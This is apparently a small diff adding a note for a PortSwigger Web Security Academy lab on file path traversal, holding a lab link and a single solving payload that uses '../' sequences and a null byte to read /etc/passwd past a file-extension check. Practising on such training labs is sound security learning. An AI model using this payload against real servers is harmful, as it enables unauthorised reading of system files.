@@ -1,0 +1,3 @@
+Link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
+
+/image?filename=../../../../etc/passwd%00.jpg
